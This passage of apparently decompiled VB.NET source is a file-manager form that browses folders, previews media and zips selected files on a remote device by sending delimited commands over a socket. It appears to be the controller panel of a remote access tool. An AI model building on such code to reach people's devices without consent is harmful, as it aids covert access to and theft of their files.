                    strArrays(6) = str1
                    strArrays(7) = Data.SplitData
                    strArrays(8) = Conversions.ToString(e.RowIndex)
                    strArrays(9) = Data.SplitData
                    strArrays(10) = "video"
                    socketClient.Send(String.Concat(strArrays))
                End If
            ElseIf (Me.ViewImge.Visible) Then
                Me.ViewImge.Image = Nothing
                Me.ViewImge.Visible = False
            End If
        ElseIf (Me.ViewImge.Visible) Then
            Me.ViewImge.Image = Nothing
            Me.ViewImge.Visible = False
        End If
    End Sub

    Private Sub ViewManager_CellMouseDoubleClick(ByVal sender As Object, ByVal e As DataGridViewCellMouseEventArgs) Handles ViewManager.CellMouseDoubleClick
        Try
            If (If(e.RowIndex < 0, False, e.ColumnIndex >= 0)) Then
                If (Me.TEXTPATH.Enabled) Then
                    If (Me.ViewManager.SelectedRows.Count = 1) Then
                        For i As Integer = Me.ViewManager.SelectedRows.Count - 1 To 0 Step -1
                            If (Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(3).Value).StartsWith("Folder Files")) Then
                                Dim str As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(1).Value)
                                Me.TEXTPATH.Enabled = False
                                Me.RemovObjOld(Me.TEXTPATH.Text)
                                Me.testName = str
                                Me.GetPath(String.Concat(Me.TEXTPATH.Text, "/", str))
                                If (Me.BTNNEXT0.Enabled) Then
                                    Me.BTNNEXT0.Enabled = False
                                    Me.BTNNEXT0.Tag = Nothing
                                    Me.BTNBACK0.Focus()
                                End If
                            End If
                        Next

                    End If
                End If
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub ViewManager_EditModeChanged(ByVal sender As Object, ByVal e As DataGridViewCellCancelEventArgs) Handles ViewManager.EditModeChanged
        Try
            Dim rowIndex As Integer = e.RowIndex
            If (Not (rowIndex <> -1 And e.ColumnIndex = 1)) Then
                Me.idfile = -1
                Me.strNameFile = Nothing
                e.Cancel = True
                Me.ViewManager.EditMode = DataGridViewEditMode.EditProgrammatically
            ElseIf (Me.ViewManager.Rows.GetRowCount(DataGridViewElementStates.Selected) <> 1) Then
                Me.idfile = -1
                Me.strNameFile = Nothing
                e.Cancel = True
                Me.ViewManager.EditMode = DataGridViewEditMode.EditProgrammatically
            Else
                e.Cancel = False
                Me.idfile = rowIndex
                Me.ViewManager.Rows(rowIndex).DefaultCellStyle.SelectionBackColor = Color.FromArgb(37, 37, 38)
                Me.strNameFile = Me.ViewManager.Rows(rowIndex).Cells(1).Value.ToString()
            End If
        Catch ex As Exception

        End Try

    End Sub

    Private Sub ViewManager_MouseClick(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ViewManager.MouseClick
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub ViewManager_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ViewManager.MouseWheel
        If (e.Delta <= 1) Then
            Dim visualStudioVerticalScrollBar1 As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            visualStudioVerticalScrollBar1.Value = visualStudioVerticalScrollBar1.Value + 1
        Else
            Dim value As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            value.Value = value.Value - 1
        End If
    End Sub

    Private Sub ViewManager_RowsAdded(ByVal sender As Object, ByVal e As DataGridViewRowsAddedEventArgs) Handles ViewManager.RowsAdded
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub ViewManager_RowsRemoved(ByVal sender As Object, ByVal e As DataGridViewRowsRemovedEventArgs) Handles ViewManager.RowsRemoved
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub ViewManager_RowStateChanged(ByVal sender As Object, ByVal e As DataGridViewRowStateChangedEventArgs) Handles ViewManager.RowStateChanged
        If (e.Row.Index <> -1) Then
            If (e.StateChanged = DataGridViewElementStates.Selected) Then
                Me.aq1 = e.Row.Index + 1
                Me.VisualStudioVerticalScrollBar1.Llen = If(e.Row.Index >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.Row.Index)
            End If
        ElseIf (e.StateChanged <> DataGridViewElementStates.Selected) Then
            Me.aq1 = 0
        Else
            Me.aq1 = 1
        End If
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub ViewManager_Scroll(ByVal sender As Object, ByVal e As ScrollEventArgs) Handles ViewManager.Scroll
        If (e.ScrollOrientation <> ScrollOrientation.HorizontalScroll) Then
            Me.y = e.NewValue
            Me.VisualStudioVerticalScrollBar1.Value = Me.y
        Else
            Me.x = e.NewValue
            Me.VisualStudioHorizontalScrollBar1.Value = Me.x
        End If
    End Sub

    Private Sub ViewManager_Sorted(ByVal sender As Object, ByVal e As EventArgs) Handles ViewManager.Sorted
        Me.VisualStudioVerticalScrollBar1.Llen = -1
    End Sub

    Private Sub VisualStudioHorizontalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioHorizontalScrollBar1.Scroll
        Try
            If (Me.ViewManager.HorizontalScrollingOffset <> -1) Then
                Me.ViewManager.HorizontalScrollingOffset = Me.VisualStudioHorizontalScrollBar1.Value
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub VisualStudioVerticalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioVerticalScrollBar1.Scroll
        Try
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex <> -1) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = Me.VisualStudioVerticalScrollBar1.Value
            End If
        Catch exception As System.Exception
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = Me.ViewManager.RowCount - 1
            End If
        End Try
    End Sub

    Private Sub ZipToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ZipToolStripMenuItem1.Click
        Dim zipFile As ZipFiles = New ZipFiles()
        If (zipFile.ShowDialog(Me) = System.Windows.Forms.DialogResult.OK) Then
            Try
                Dim str As String = zipFile.aFileName.Text.Trim()
                If (str.Length > 0) Then
                    If (Not str.ToUpper().EndsWith(".ZIP")) Then
                        str = String.Concat(str, ".zip")
                    End If
                End If
                If (Operators.CompareString(str, "", False) <> 0) Then
                    If (Me.ViewManager.SelectedRows.Count > 0) Then
                        Dim stringBuilder As System.Text.StringBuilder = New System.Text.StringBuilder()
                        Dim count As Integer = Me.ViewManager.SelectedRows.Count - 1
                        While count >= 0
                            If (Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(count).Index).Cells(3).Value).StartsWith("Folder Files")) Then
                                zipFile.Close()
                                Return
                            Else
                                Dim str1 As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(count).Index).Cells(1).Value)
                                stringBuilder.Append(String.Concat(Me.TEXTPATH.Text, "/", str1, SN.Data.SplitArray))
                                count = count + -1
                            End If
                        End While
                        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(46)), SN.Data.SplitData, str, SN.Data.SplitData, stringBuilder.ToString(), SN.Data.SplitData, Me.TEXTPATH.Text, "/"}))
                    End If
                End If
                zipFile.Close()
            Catch exception As System.Exception
                zipFile.Close()
            End Try
        Else
            zipFile.Close()
        End If
    End Sub
End Class